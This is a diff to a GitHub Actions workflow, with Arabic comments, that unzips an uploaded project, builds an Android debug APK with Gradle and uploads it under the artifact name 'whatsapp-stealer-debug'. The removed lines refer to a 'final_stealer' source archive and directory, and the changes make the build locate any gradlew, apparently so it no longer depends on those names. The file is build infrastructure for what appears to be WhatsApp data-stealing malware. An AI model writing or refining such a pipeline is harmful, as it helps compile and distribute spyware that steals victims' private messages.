@@ -15,15 +15,8 @@ jobs:
 
     - name: Unzip Project Archive
       run: |
-        # البحث عن أي ملف مضغوط تم رفعه وفكه تلقائياً
-        if [ -f final_stealer_src.zip ]; then
-          unzip -o final_stealer_src.zip
-        elif [ -f project.zip ]; then
-          unzip -o project.zip
-        else
-          # فك أول ملف zip موجود في المجلد إذا لم يكن بالاسم المحدد
-          unzip -o '*.zip'
-        fi
+        # فك أي ملف مضغوط موجود في الجذر
+        unzip -o '*.zip'
         ls -la
 
     - name: Set up JDK 17
@@ -32,16 +25,24 @@ jobs:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: Grant execute permission for gradlew
-      run: chmod +x final_stealer/gradlew
-
-    - name: Build Debug APK
+    - name: Find and Build APK
       run: |
-        cd final_stealer
+        # البحث عن مكان ملف gradlew التنفيذي تلقائياً وبدء البناء منه
+        GRADLEW_PATH=$(find . -name "gradlew" -type f)
+        if [ -z "$GRADLEW_PATH" ]; then
+          echo "Error: gradlew not found!"
+          exit 1
+        fi
+        
+        PROJECT_DIR=$(dirname "$GRADLEW_PATH")
+        echo "Found project at: $PROJECT_DIR"
+        
+        cd "$PROJECT_DIR"
+        chmod +x gradlew
         ./gradlew assembleDebug
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
       with:
         name: whatsapp-stealer-debug
-        path: final_stealer/app/build/outputs/apk/debug/app-debug.apk
+        path: '**/build/outputs/apk/debug/app-debug.apk'
